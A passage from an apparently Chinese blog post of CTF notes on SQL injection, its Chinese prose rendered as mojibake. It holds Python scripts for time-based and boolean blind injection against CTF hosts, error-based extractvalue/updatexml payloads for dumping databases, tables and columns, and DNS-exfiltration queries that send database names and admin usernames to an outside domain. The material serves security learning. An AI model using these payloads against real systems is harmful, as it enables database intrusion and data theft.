class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url = url,headers = headers,timeout = <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag is :&#123;"</span> +flag+<span class="string">"&#125;"</span>)</span><br><span class="line">//æ•°æ®åº“</span><br><span class="line">payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">åº“ä¸ºweb15</span><br><span class="line">//è¡¨</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">è¡¨ä¸ºclient_ip,flag</span><br><span class="line">//åˆ—</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">flag</span><br><span class="line">//flag</span><br><span class="line">payload = <span class="string">"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p><blockquote><p>flag{cdbf14c9551d5be5612f7bb5d2867853}</p></blockquote><h3 id="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰"></a>å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹<strong>å¼‚æˆ–æ³¨å…¥</strong>åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å…³é”®è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¼‚æˆ–ï¼š1^1&#x3D;0ï¼Œ1^0&#x3D;1ï¼Œ0^1&#x3D;1ï¼Œ0^0&#x3D;0</span><br><span class="line">è¿™æ ·å½“æ„é€ ï¼š?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+</span><br><span class="line">è‹¥è¿”å›æ­£ç¡®é¡µé¢çš„å›æ˜¾(There is nothing.)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºå‡;</span><br><span class="line">è‹¥è¿”å›é”™è¯¯é¡µé¢çš„å›æ˜¾(Error,Error,Error!)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸã€‚</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+å‡å›æ˜¾äº†Error,Error,Error!ï¼Œè¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸï¼Œé‚£ä¹ˆå¯åˆ¤æ–­andè¢«è¿‡æ»¤äº†</span><br><span class="line">åŒç†å¯åˆ¤æ–­orã€selectã€unionä¹Ÿè¢«è¿‡æ»¤äº†</span><br><span class="line">selselectect</span><br><span class="line">uniunionon</span><br></pre></td></tr></table></figure><p>æ³¨æ„çš„æ˜¯ï¼šinformationä¸­ä¹Ÿæœ‰or</p><p>ç»§ç»­å­¦ä¹ ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;Nobody&#39; not in r.text:</span><br><span class="line">            data +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><p>åŒæ—¶äº†è§£ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</p><p>å¥½åƒæ³¨å…¥çš„æ—¶å€™æ˜¯ä¸éœ€è¦selectçš„ï¼Œä½†åœ¨mysqlä¸­æ˜¯éœ€è¦çš„</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png" alt="image-20200816164858101"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure><h3 id="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifå¸ƒå°”ç›²æ³¨ï¼‰</h3><p>æ ¹æ®é¢˜ç›®å¯çŸ¥ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a,b,c) aå¯¹å°±æ‰§è¡Œbï¼Œå¦åˆ™å°±æ‰§è¡Œc</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®æ­£å¥½æ˜¯id=1,2ä¼šå¯¹ï¼Œ3å°±é”™æ‰€ä»¥æˆ‘ä»¬æŠŠb=1æˆ–2ï¼Œcä¸º3</p><p>æ¥ä¸‹æ¥å†™è„šæœ¬å°±å¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;query_success&#39; in r.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¸­é—´å¥½åƒæ˜¯æœåŠ¡å™¨ä¼šå…³é—­æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†ç»„æ‰«æ</p><p>æ¯”å¦‚ä»1-30ï¼Œ30-50</p><h3 id="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"><a href="#ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰" class="headerlink" title="ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰"></a>ctfhubï¼ˆifæ—¶é—´ç›²æ³¨ï¼‰</h3><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ç›´æ¥å†™è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#è¡¨</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#åˆ—</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure><h3 id="3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#3-åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>3.åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">' and updataxml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹ç”¨æˆ·</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //æŸ¥çœ‹æ•°æ®åº“</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updataxml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+    //æŸ¥çœ‹æ•°æ®åº“çš„åå­—</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="keyword">test</span> <span class="string">' limit 0,1),0x7e),1) --+     //æŸ¥çœ‹å„è¡¨çš„åå­—</span></span><br><span class="line"><span class="string">'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'my student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //æŸ¥çœ‹åˆ—çš„åå­—</span></span><br></pre></td></tr></table></figure><h2 id="4-äºŒæ¬¡æ³¨å…¥"><a href="#4-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="4.äºŒæ¬¡æ³¨å…¥"></a>4.äºŒæ¬¡æ³¨å…¥</h2><h3 id="0x01äºŒæ¬¡æ³¨å…¥åŸç†"><a href="#0x01äºŒæ¬¡æ³¨å…¥åŸç†" class="headerlink" title="0x01äºŒæ¬¡æ³¨å…¥åŸç†"></a>0x01äºŒæ¬¡æ³¨å…¥åŸç†</h3><p><strong>é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</strong></p><ul><li><p>ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®<br>è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚</p></li><li><p>ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®<br>å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚</p></li></ul><h2 id="5-DNSæ³¨å…¥"><a href="#5-DNSæ³¨å…¥" class="headerlink" title="5.DNSæ³¨å…¥"></a>5.DNSæ³¨å…¥</h2><h3 id="0x01DNS"><a href="#0x01DNS" class="headerlink" title="0x01DNS"></a>0x01DNS</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png" alt="image-20200609202338069"></p><h3 id="0x02æ³¨å…¥å‡½æ•°"><a href="#0x02æ³¨å…¥å‡½æ•°" class="headerlink" title="0x02æ³¨å…¥å‡½æ•°"></a>0x02æ³¨å…¥å‡½æ•°</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png" alt="image-20200609203639074"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;è¯»å–æ–‡ä»¶</span><br><span class="line">select load_file(&quot;\\\\xxx.php90.cn\\ccc&quot;)      &#x2F;&#x2F;è½¬ä¹‰</span><br></pre></td></tr></table></figure><h3 id="0x03æ³¨å…¥"><a href="#0x03æ³¨å…¥" class="headerlink" title="0x03æ³¨å…¥"></a>0x03æ³¨å…¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,(select database()),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\cc&quot;));</span><br></pre></td></tr></table></figure><h2 id="6-æŠ¥é”™æ³¨å…¥"><a href="#6-æŠ¥é”™æ³¨å…¥" class="headerlink" title="6.æŠ¥é”™æ³¨å…¥"></a>6.æŠ¥é”™æ³¨å…¥</h2><p>æ›´è¯¦ç»†çš„è§£é‡Š<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p>æŠ¥é”™æ³¨å…¥åœ¨æ²¡æ³•ç”¨unionè”åˆæŸ¥è¯¢æ—¶ç”¨ï¼Œä½†å‰æè¿˜æ˜¯ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°ã€‚</p><p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œäººä¸ºåœ°åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿå‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹<code>xpathè¯­æ³•é”™è¯¯</code>å’Œ<code>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</code></p><h3 id="xpathè¯­æ³•é”™è¯¯"><a href="#xpathè¯­æ³•é”™è¯¯" class="headerlink" title="xpathè¯­æ³•é”™è¯¯"></a>xpathè¯­æ³•é”™è¯¯</h3><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°ã€‚<br>ä½¿ç”¨æ¡ä»¶ï¼šmysqlç‰ˆæœ¬&gt;5.1.5</p><p><strong>extractvalueå‡½æ•°</strong></p><blockquote><p>å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)<br>æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</p></blockquote><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ±‚ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ã€‚</p><p>pyloadï¼š<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥))))</code></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹mysqlæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ•°æ®åº“åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">çˆ†è¡¨åï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">çˆ†å­—æ®µåï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">çˆ†æ•°æ®ï¼šid&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><ul><li>â‘  0x7e=â€™~â€™</li><li>â‘¡ concat(â€˜aâ€™,â€˜bâ€™)=â€œabâ€</li><li>â‘¢ version()=@@version</li><li>â‘£ â€˜~â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦</li><li>â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</li></ul><p><strong>updatexml</strong></p><blockquote><p>å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)<br>æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p></blockquote><p>ç¬¬äºŒä¸ªå‚æ•°è·Ÿextractvalueå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œä¸”åˆ©ç”¨æ–¹å¼ç›¸åŒ<br>payloadï¼š<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(selectè¯­å¥())),&quot;anything&quot;))</code></p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class="line">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œé’ˆå¯¹mysqlï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">çˆ†æ•°æ®åº“åï¼š&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">çˆ†è¡¨åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">çˆ†åˆ—åï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">çˆ†æ•°æ®ï¼š&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h3 id="concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤"><a href="#concat-rand-group-by-å¯¼è‡´ä¸»é”®é‡å¤" class="headerlink" title="concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤"></a>concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤</h3><p>è¿™ç§æŠ¥é”™æ–¹æ³•çš„æœ¬è´¨æ˜¯å› ä¸ºfloor(rand(0)*2)çš„é‡å¤æ€§ï¼Œå¯¼è‡´group byè¯­å¥å‡ºé”™ã€‚group by 